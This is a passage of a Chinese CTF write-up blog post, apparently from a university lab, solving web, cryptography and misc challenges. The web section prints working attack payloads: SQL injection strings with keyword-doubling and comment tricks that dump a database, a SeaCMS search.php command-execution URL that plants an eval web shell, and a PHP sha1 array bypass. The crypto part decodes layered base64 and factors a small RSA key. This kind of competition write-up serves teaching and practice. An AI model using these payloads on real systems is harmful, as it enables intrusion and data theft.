+<p>另外过滤了<code>or,select,union,空格,逗号，等号</code>，绕过方法分别为：（1）双写or，select，union（2）用<code>/**/</code>代替空格（3）用<code>select()a join select ()b</code>代替逗号（4）用<code>like，regexp</code>代替等号</p>
+<p>爆数据库payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64.b64encode(<span class="string">'0/**/uunionnion/**/sselectelect/**/*/**/from/**/((sselectelect/**/database())a/**/join/**/(sselectelect/**/2)b/**/join/**/(sselectelect/**/3)c/**/join/**/(sselectelect/**/4)d/**/join/**/(sselectelect/**/5)e/**/join/**/(sselectelect/**/6)f)'</span>)[::<span class="number">-1</span>]</span><br></pre></td></tr></table></figure>
+<p>数据库名：<code>ctf_sql</code></p>
+<p>爆表名payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64.b64encode(&quot;0/**/uunionnion/**/sselectelect/**/*/**/from/**/((sselectelect/**/database())a/**/join/**/(sselectelect/**/2)b/**/join/**/(sselectelect/**/3)c/**/join/**/(sselectelect/**/4)d/**/join/**/(sselectelect/**/5)e/**/join/**/(sselectelect/**/group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema/**/like/**/database())f)&quot;)[::-1]</span><br></pre></td></tr></table></figure>
+<p>表名：<code>book,flag</code></p>
+<p>爆列名payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64.b64encode(&quot;0/**/uunionnion/**/sselectelect/**/*/**/from/**/((sselectelect/**/database())a/**/join/**/(sselectelect/**/2)b/**/join/**/(sselectelect/**/3)c/**/join/**/(sselectelect/**/4)d/**/join/**/(sselectelect/**/5)e/**/join/**/(sselectelect/**/group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_name/**/like/**/0x666c6167)f)&quot;)[::-1]</span><br></pre></td></tr></table></figure>
+<p>列名：<code>flag</code></p>
+<p>爆flag payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64.b64encode(&quot;0/**/uunionnion/**/sselectelect/**/*/**/from/**/((sselectelect/**/database())a/**/join/**/(sselectelect/**/2)b/**/join/**/(sselectelect/**/3)c/**/join/**/(sselectelect/**/4)d/**/join/**/(sselectelect/**/5)e/**/join/**/(sselectelect/**/flag/**/from/**/flag)f)&quot;)[::-1]</span><br></pre></td></tr></table></figure>
+<p>flag：<code>flag{s9li_1s_s0_e4sY}</code></p>
+<h3 id="作战计划"><a href="#作战计划" class="headerlink" title="作战计划"></a>作战计划</h3><p>题目链接：<a href="http://47.103.43.235:84" target="_blank" rel="noopener">http://47.103.43.235:84</a></p>
+<p>海洋cms，之前就爆出的<code>search.php</code>存在命令执行漏洞，payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.103.43.235:84/search.php?searchtype=5&amp;tid=&amp;area=eval($_POST[1])</span><br></pre></td></tr></table></figure>
+<p>通过菜刀连接后，在根目录下找到<code>flag.txt</code>，获得flag</p>
+<p>flag：<code>flag{!!seacms_@@}</code></p>
+<h3 id="池步洲"><a href="#池步洲" class="headerlink" title="池步洲"></a>池步洲</h3><p>题目链接：<a href="http://47.103.43.235:82/web/b/index.php" target="_blank" rel="noopener">http://47.103.43.235:82/web/b/index.php</a></p>
+<p>源代码给出提示文件<code>index.phps</code>，访问后下载获得源代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$flag = <span class="string">'********'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'name'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">	<span class="keyword">if</span> ($_POST[<span class="string">'name'</span>] == $_POST[<span class="string">'password'</span>])</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'name and password must be diffirent'</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (sha1($_POST[<span class="string">'name'</span>]) === sha1($_POST[<span class="string">'password'</span>]))</span><br><span class="line">		<span class="keyword">die</span>($flag);</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">print</span> <span class="string">'invalid password'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>sha1函数无法处理数组，通过传入两个数组即可绕过过滤，payload：<code>name[]=1&amp;password[]=2</code></p>
+<p>flag：<code>flag{Y0u_just_br0ke_sha1}</code></p>
+<h2 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h2><h3 id="日军空袭"><a href="#日军空袭" class="headerlink" title="日军空袭"></a>日军空袭</h3><p>题目链接：<a href="http://47.103.43.235:82/crypto/a/index.php" target="_blank" rel="noopener">http://47.103.43.235:82/crypto/a/index.php</a></p>
+<p>页面给了一串看似base64加密后的字符串，经过一次base64解密发现末尾出现了<code>$3D</code>说明可能还存在URL编码，所以需要URL和base64循环解码，脚本代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> unquote</span><br><span class="line"></span><br><span class="line">s = <span class="string">'Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSWFJteFZVMjA1VjAxV2JETlhhMk0xVmpKS1NHVkVRbUZXVmxsM1ZqQmFTMlJIVmtkWGJGcHBWa1phZVZadGVGWmxSbGw1Vkd0c2FsSnRhRzlVVm1oRFZWWmFkR05GZEZSTlZXdzFWVEowVjFaWFNraGhSemxWVmpOT00xcFZXbXRXTVhCRlZXeHdWMDFFUlRCV2Fra3hVakZhV0ZOcmFGWmlhMHBYV1d4b1UwMHhWWGhYYlhSWFRWWndNRlZ0ZUZOVWJVWTJVbFJDVjJFeVRYaFdSRVpyVTBaT2NscEhjRk5XUjNob1YxZDRiMVV4VWtkWGJrNVlZbGhTV0ZSV1pEQk9iR3hXVjJ4T1ZXSkdjRlpXYlhoelZqRmFObEZZYUZkU1JYQklWbXBHVDFkV2NFZGhSMnhUWVROQ1dsWXhXbXROUjFGNVZXNU9hbEp0VWxsWmJGWmhZMnhXY1ZKdFJsUlNiR3cxVkZaU1UxWnJNWEpqUm1oV1RXNVNNMVpxU2t0V1ZrcFpXa1p3VjFKWVFrbFdiWEJIVkRGa1YyTkZaR2hTTW5oVVdWUk9RMWRzV1hoWGJYUk9VbTE0V0ZaWGRHdFdNV1JJWVVac1dtSkhhRlJXTUZwVFZqRndSMVJ0ZUdsU2JYY3hWa1phVTFVeFduSk5XRXBxVWxkNGFGVXdhRU5TUmxweFUydGFiRlpzU2xwWlZWcHJZVWRGZWxGcmJGZGlXRUpJVmtSS1UxWXhXblZWYldoVFlYcFdlbGRYZUc5aU1XUkhWMjVTVGxkSFVsWlVWbHBIVFRGU2MxWnRkRmRpVlhCNVdUQmFjMWR0U2tkWGJXaGFUVlp3ZWxreU1VZFNiRkp6Vkcxc1UySnJTbUZXTW5oWFdWWlJlRmRzYUZSaVJuQnhWV3hrVTFsV1VsWlhiVVpyWWtad2VGVnRkREJWTWtwSVZXcENXbFpXY0hKWlZXUkdaVWRPU0U5V2FHaE5WbkJ2Vm10U1MxUXlUWGxVYTFwaFVqSm9WRlJYTVc5bGJHUllaVWM1YVUxWFVucFdNV2h2VjBkS1dWVnJPVlppVkVVd1ZqQmFZVmRIVWtoa1JtUnBWbGhDU2xkV1ZtOVVNVnAwVW01S1QxWnNTbGhVVlZwM1ZrWmFjVkp0ZEd0V2JrSkhWR3hhVDJGV1NuUlBWRTVYVFc1b1dGbFVRWGhUUmtweVdrWm9hV0Y2Vm5oV1ZFSnZVVEZzVjFWc1dsaGlWVnB6V1d0YWQyVkdWWGxrUjNSb1lsVndWMWx1Y0V0V2JGbDZZVVJPV21FeVVrZGFWM2hIWTIxS1IyRkdhRlJTVlhCS1ZtMTBVMU14VlhoWFdHaFhZbXhhVjFsc2FFTldSbXhaWTBaa2EwMVdjREJaTUZZd1lWVXhXRlZyYUZkTmFsWlVWa2Q0UzFKc1pIVlRiRlpYWWtoQ05sWkhlR0ZaVm1SR1RsWmFVRlp0YUZSWmJGcExVMnhhYzFwRVVtcE5WMUl3VlRKMGIyRkdTbk5UYlVaVlZteHdNMVpyV21GalZrcDFXa1pPVGxacmIzZFhiRlpyWXpGVmVWTnNiRnBOTW1oWVZGWmFTMVZHY0VWU2EzQnNVbTFTV2xkclZURldNVnB6WTBaV1dGWXpVbkpXVkVaelZqRldjMWRzYUdsV1ZuQlFWa1phWVdReVZrZFdibEpzVTBkU2NGVnFRbmRXTVZsNVpFaGtWMDFFUmpGWlZWSlBWMjFGZVZWclpHRldNMmhJV1RKemVGWXhjRWRhUlRWT1VsaENTMVp0TVRCVk1VMTRWVzVTVjJFeVVtaFZNRnBoVmpGc2MxcEVVbGRTYlhoYVdUQmFhMWRHV25OalJteGFUVVpWTVZsV1ZYaFhSbFp6WVVaa1RsWXlhREpXTVZwaFV6RkplRlJ1VmxKaVJscFlXV3RvUTFkV1draGtSMFpvVFdzMWVsWXlOVk5oTVVsNVlVWm9XbFpGTlVSVk1WcHJWbFpHZEZKc1drNVdNVWwzVmxkNGIySXhXWGhhUldob1VtMW9WbFpzV25kTk1XeFdWMjVrVTJKSVFraFdSM2hUVlRKRmVsRllaRmhpUmxweVdYcEdWbVZXVG5KYVIyaE9UVzFvV1ZaR1l6RlZNV1JIVjJ4V1UyRXhjSE5WYlRGVFYyeGtjbFpVUmxkTmEzQktWVmMxYjFZeFdqWlNWRUpoVWtWYWNsVnFTa3RUVmxKMFlVWk9hR1ZzV2pSV2JUQjRaV3N4V0ZadVRsaGlSMmh4V2xkNFlWWXhVbGRYYlVaWFZteHdlbGxWYUd0V2F6RldWbXBTVjJKWVFtaFdiVEZHWkRGYWRWUnNWbGRTVlhCVVYxZDBWbVF5VVhoV2JGSlhWMGhDVkZWV1RsWmxiRXBFVmxod1UxRlRWWHBTUTFWNlVrRWxNMFFsTTBRJTNE'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="string">'%'</span> <span class="keyword">in</span> s:</span><br><span class="line">        s = unquote(s)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = b64decode(s)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> s</span><br></pre></td></tr></table></figure>
+<p>得到s = <code>fB__l621a4h4g_ai{&amp;i}</code>，每五位凑成flag的一个字符，最后得到flag：<code>flag{B64_&amp;_2hai_14i}</code></p>
+<h3 id="潘汉年"><a href="#潘汉年" class="headerlink" title="潘汉年"></a>潘汉年</h3><p>题目给出字符串和提示flag格式，观察字符串和flag的ascii编码，发现从4开始逐位在原来基础上+1</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">"bg[`sZ*Zg'dPfP`VM_SXVd"</span></span><br><span class="line">f = <span class="string">"flag"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">print</span> ord(f[i]) - ord(s[i])</span><br></pre></td></tr></table></figure>
+<p>结果得到4,5,6,7，验证了想法</p>
+<p>据此对密文进行还原：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">"bg[`sZ*Zg'dPfP`VM_SXVd"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line">offset = <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)):</span><br><span class="line">    flag = flag + chr(ord(s[i]) + offset)</span><br><span class="line">    offset = offset + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
+<p>得到flag：<code>flag{c4es4r_variation}</code></p>
+<h3 id="袁殊"><a href="#袁殊" class="headerlink" title="袁殊"></a>袁殊</h3><p>RSA 摸熟 n 过小，导致可被分解的问题，先用 openssl 提取公钥中的 e 和 n</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">openssl rsa -pubin -text -modulus -in warmup -in gy.key</span><br><span class="line"></span><br><span class="line">Public-Key: (256 bit)</span><br><span class="line">Modulus:</span><br><span class="line">    00:a9:bd:4c:7a:77:63:37:0a:04:2f:e6:be:c7:dd:</span><br><span class="line">    c8:41:60:2d:b9:42:c7:a3:62:d1:b5:d3:72:a4:d0:</span><br><span class="line">    89:12:d9</span><br><span class="line">Exponent: 65537 (0x10001)</span><br><span class="line">Modulus=A9BD4C7A7763370A042FE6BEC7DDC841602DB942C7A362D1B5D372A4D08912D9</span><br><span class="line">writing RSA key</span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAKm9THp3YzcKBC/mvsfdyEFgLblCx6Ni</span><br><span class="line">0bXTcqTQiRLZAgMBAAE=</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure>
+<p>在 factordb.com 分解 n 得到素因子 p 和 q， 解得私钥 d，再解得明文 m</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">0xA9BD4C7A7763370A042FE6BEC7DDC841602DB942C7A362D1B5D372A4D08912D9</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">273821108020968288372911424519201044333</span></span><br><span class="line">q = <span class="number">280385007186315115828483000867559983517</span></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"><span class="keyword">assert</span> GCD(e, phi) == <span class="number">1</span></span><br><span class="line">d = inverse(e, phi)</span><br><span class="line"></span><br><span class="line">c = open(<span class="string">'E:\\Downloads\\CTF\\RSA256\\fllllllag.txt'</span>, <span class="string">'rb'</span>).read()</span><br><span class="line">c = bytes_to_long(c)</span><br><span class="line">m = pow(c, d, n)</span><br><span class="line"><span class="keyword">print</span> long_to_bytes(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;_2o!9_CTF_ECUN_&#125;</span></span><br></pre></td></tr></table></figure>
+<h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><h3 id="死亡真相"><a href="#死亡真相" class="headerlink" title="死亡真相"></a>死亡真相</h3><p>题目链接：<a href="https://47.103.43.235:85/d/奇怪的单点音.wav" target="_blank" rel="noopener">https://47.103.43.235:85/d/奇怪的单点音.wav</a> </p>
+<p><img src="/2019/04/10/CTF-上海嘉伟思杯-WP/./4.png" alt></p>
+<p>在空缺处补0，再进行md5解密得到flag:<code>flag{hsd132456}</code></p>
+<h3 id="大美晚报"><a href="#大美晚报" class="headerlink" title="大美晚报"></a>大美晚报</h3><p>题目链接：<a href="http://47.103.43.235:82/web/c/" target="_blank" rel="noopener">http://47.103.43.235:82/web/c/</a></p>
+<p>题目给了一个二维码，保存图片后foremost，得到一个压缩包，提示说是管理员QQ号，直接爆破出号码：674290437</p>
+<p>获得flag：<code>flag{d6@YX$_m^aa0}</code></p>
+
+        
+    
+
+    
+</div>
+
+
+                
+
+                <!-- Post Comments -->
+                
+                    
+                
+            </div>
+
+            <!-- Post Prev & Next Nav -->
+            <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
+    <!-- Prev Nav -->
+    
+
+    <!-- Section Spacer -->
+    <div class="section-spacer"></div>
+
+    <!-- Next Nav -->
+    
+</nav>
+
+        </div>
+    </div>
+
+
+
+                    
+                        <!-- Overlay For Active Sidebar -->
+<div class="sidebar-overlay"></div>
+
+<!-- Material sidebar -->
+<aside id="sidebar" class="sidebar sidebar-colored sidebar-fixed-left" role="navigation">
+    <div id="sidebar-main">
+        <!-- Sidebar Header -->
+        <div class="sidebar-header header-cover" style="background-image: url(/img/sidebar_header.png);">
+    <!-- Top bar -->
+    <div class="top-bar"></div>
+
+    <!-- Sidebar toggle button -->
+    <button type="button" class="sidebar-toggle mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon" style="display: initial;" data-upgraded=",MaterialButton,MaterialRipple">
+        <i class="material-icons">clear_all</i>
+        <span class="mdl-button__ripple-container">
+            <span class="mdl-ripple">
+            </span>
+        </span>
+    </button>
+
+    <!-- Sidebar Avatar -->
+    <div class="sidebar-image">
+        <img src="/img/avatar.png" alt="FAFU's avatar">
+    </div>
+
+    <!-- Sidebar Email -->
+    <a data-toggle="dropdown" class="sidebar-brand" href="#settings-dropdown">
+        youremail@email.com
+        <b class="caret"></b>
+    </a>
+</div>
+
+
+        <!-- Sidebar Navigation  -->
+        <ul class="nav sidebar-nav">
+    <!-- User dropdown  -->
+    <li class="dropdown">
+        <ul id="settings-dropdown" class="dropdown-menu">
+            
+                <li>
+                    <a href="#" target="_blank" title="Email Me">
+                        
+                            <i class="material-icons sidebar-material-icons sidebar-indent-left1pc-element">email</i>
+                        
+                        Email Me
+                    </a>
+                </li>
+            
+        </ul>
+    </li>
+
+    <!-- Homepage -->
+    
+        <li id="sidebar-first-li">
+            <a href="/">
+                
+                    <i class="material-icons sidebar-material-icons">home</i>
+                
+                主页
+            </a>
+        </li>
+        
+    
+
+    <!-- Archives  -->
+    
+        <li class="dropdown">
+            <a href="#" class="ripple-effect dropdown-toggle" data-toggle="dropdown">
+                
+                    <i class="material-icons sidebar-material-icons">inbox</i>
+                
+                    归档
+                <b class="caret"></b>
+            </a>
+            <ul class="dropdown-menu">
+            <li>
+                <a class="sidebar_archives-link" href="/archives/2019/04/">四月 2019<span class="sidebar_archives-count">1</span></a>
+            </li></ul>
+        </li>
+        
+    
+
+    <!-- Categories  -->
+    
+
+    <!-- Pages  -->
+    
+
+    <!-- Article Number  -->
+    
+</ul>
+
+
+        <!-- Sidebar Footer -->
+        <!--
+I'm glad you use this theme, the development is no so easy, I hope you can keep the copyright, I will thank you so much.
+If you still want to delete the copyrights, could you still retain the first one? Which namely "Theme Material"
+It will not impact the appearance and can give developers a lot of support :)
+
+很高兴您使用并喜欢该主题，开发不易 十分谢谢与希望您可以保留一下版权声明。
+如果您仍然想删除的话 能否只保留第一项呢？即 "Theme Material"
+它不会影响美观并可以给开发者很大的支持和动力。 :)
+-->
+
+<!-- Sidebar Divider -->
+
+    <div class="sidebar-divider"></div>
+
+
+<!-- Theme Material -->
+
+    <a href="https://github.com/viosey/hexo-theme-material" class="sidebar-footer-text-a" target="_blank">
+        <div class="sidebar-text mdl-button mdl-js-button mdl-js-ripple-effect sidebar-footer-text-div" data-upgraded=",MaterialButton,MaterialRipple">
+            主题 - Material
+            <span class="sidebar-badge badge-circle">i</span>
+        </div>
+    </a>
+
+
+<!-- Help & Support -->
+<!--
+
+-->
+
+<!-- Feedback -->
+<!--
+
+-->
+
+<!-- About Theme -->
+<!--
+
+-->
+
+    </div>
+
+    <!-- Sidebar Image -->
+    
+
+</aside>
+
+                    
+
+                    
+                        <!-- Footer Top Button -->
+                        <div id="back-to-top" class="toTop-wrap">
+    <a href="#top" class="toTop">
+        <i class="material-icons footer_top-i">expand_less</i>
+    </a>
+</div>
+
+                    
+
+                    <!--Footer-->
+<footer class="mdl-mini-footer" id="bottom">
+    
+        <!-- Paradox Footer Left Section -->
+        <div class="mdl-mini-footer--left-section sns-list">
+    <!-- Twitter -->
+    
+        <a href="https://twitter.com/twitter" target="_blank">
+            <button class="mdl-mini-footer--social-btn social-btn footer-sns-twitter">
+                <span class="visuallyhidden">Twitter</span>
+            </button><!--
+     --></a>
+    
+
+    <!-- Facebook -->
+    
+        <a href="https://www.facebook.com/facebook" target="_blank">
+            <button class="mdl-mini-footer--social-btn social-btn footer-sns-facebook">
+                <span class="visuallyhidden">Facebook</span>
+            </button><!--
+     --></a>
+    
+
+    <!-- Google + -->
+    
+        <a href="https://www.google.com/" target="_blank">
+            <button class="mdl-mini-footer--social-btn social-btn footer-sns-gplus">
+                <span class="visuallyhidden">Google Plus</span>
+            </button><!--
+     --></a>
+    
+
+    <!-- Weibo -->
+    
+
+    <!-- Instagram -->
+    
+
+    <!-- Tumblr -->
+    
+
+    <!-- Github -->
+    
+
+    <!-- LinkedIn -->
+    
+
+    <!-- Zhihu -->
+    
+
+    <!-- Bilibili -->
+    
+
+    <!-- Telegram -->
+    
+
+    <!-- V2EX -->
+    
+
+    <!-- Segmentfault -->
+    
+</div>
+
+
+        <!--Copyright-->
+        <div id="copyright">
+            Copyright&nbsp;©&nbsp;<span year></span>&nbsp;0xFAFU实验室
+            
+        </div>
+
+        <!-- Paradox Footer Right Section -->
+
+        <!--
+        I am glad you use this theme, the development is no so easy, I hope you can keep the copyright.
+        It will not impact the appearance and can give developers a lot of support :)
+
+        很高兴您使用该主题，开发不易，希望您可以保留一下版权声明。
+        它不会影响美观并可以给开发者很大的支持。 :)
+        -->
+
+        <div class="mdl-mini-footer--right-section">
+            <div>
+                <div class="footer-develop-div">Powered by <a href="https://hexo.io" target="_blank" class="footer-develop-a">Hexo</a></div>
+                <div class="footer-develop-div">Theme - <a href="https://github.com/viosey/hexo-theme-material" target="_blank" class="footer-develop-a">Material</a></div>
+            </div>
+        </div>
+    
+</footer>
+
+
+                    <!-- Import JS File -->
+
+    <script>lsloader.load("lazyload_js","/js/lazyload.min.js?1BcfzuNXqV+ntF6gq+5X3Q==", true)</script>
+
+
+
+    <script>lsloader.load("js_js","/js/js.min.js?Bn9UzEm8RrBSxqyZB0zPjA==", true)</script>
+
+
+
+    <script>lsloader.load("np_js","/js/nprogress.js?pl3Qhb9lvqR1FlyLUna1Yw==", true)</script>
+
+
+<script type="text/ls-javascript" id="NProgress-script">
+    NProgress.configure({
+        showSpinner: true
+    });
+    NProgress.start();
+    $('#nprogress .bar').css({
+        'background': '#29d'
+    });
+    $('#nprogress .peg').css({
+        'box-shadow': '0 0 10px #29d, 0 0 15px #29d'
+    });
+    $('#nprogress .spinner-icon').css({
+        'border-top-color': '#29d',
+        'border-left-color': '#29d'
+    });
+    setTimeout(function() {
+        NProgress.done();
+        $('.fade').removeClass('out');
+    }, 800);
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- UC Browser Compatible -->
+<script>
+	var agent = navigator.userAgent.toLowerCase();
+	if(agent.indexOf('ucbrowser')>0) {
+		document.write('<link rel="stylesheet" href="/css/uc.css">');
+	   alert('由于 UC 浏览器使用极旧的内核，而本网站使用了一些新的特性。\n为了您能更好的浏览，推荐使用 Chrome 或 Firefox 浏览器。');
+	}
+</script>
+
+<!-- Import prettify js  -->
+
+
+
+<!-- Window Load -->
+<!-- add class for prettify -->
+<script type="text/ls-javascript" id="window-load">
+    $(window).on('load', function() {
+        // Post_Toc parent position fixed
+        $('.post-toc-wrap').parent('.mdl-menu__container').css('position', 'fixed');
+    });
+
+    
+    
+</script>
+
+<!-- MathJax Load-->
+
+
+<!-- Bing Background -->
+
+
+<script type="text/ls-javascript" id="lazy-load">
+    // Offer LazyLoad
+    queue.offer(function(){
+        $('.lazy').lazyload({
+            effect : 'show'
+        });
+    });
+
+    // Start Queue
+    $(document).ready(function(){
+        setInterval(function(){
+            queue.execNext();
+        },200);
+    });
+</script>
+
+<!-- Custom Footer -->
+
+
+
+<script>
+    var copyrightNow = new Date().getFullYear();
+    var textContent = document.querySelector('span[year]')
+
+    copyrightSince = 0000;
+    if (copyrightSince === copyrightNow||copyrightSince === 0000) {
+        textContent.textContent = copyrightNow
+    } else {
+        textContent.textContent = copyrightSince + ' - ' + copyrightNow
+    }
+
+    (function(){
+        var scriptList = document.querySelectorAll('script[type="text/ls-javascript"]')
+
+        for (var i = 0; i < scriptList.length; ++i) {
+            var item = scriptList[i];
+            lsloader.runInlineScript(item.id,item.id);
+        }
+    })()
+console.log('\n %c © Material Theme | Version: 1.5.6 | https://github.com/viosey/hexo-theme-material %c \n', 'color:#455a64;background:#e0e0e0;padding:5px 0;border-top-left-radius:5px;border-bottom-left-radius:5px;', 'color:#455a64;background:#e0e0e0;padding:5px 0;border-top-right-radius:5px;border-bottom-right-radius:5px;');
+</script>
+
+                </main>
+            </div>
+        </body>
+    
+</html>
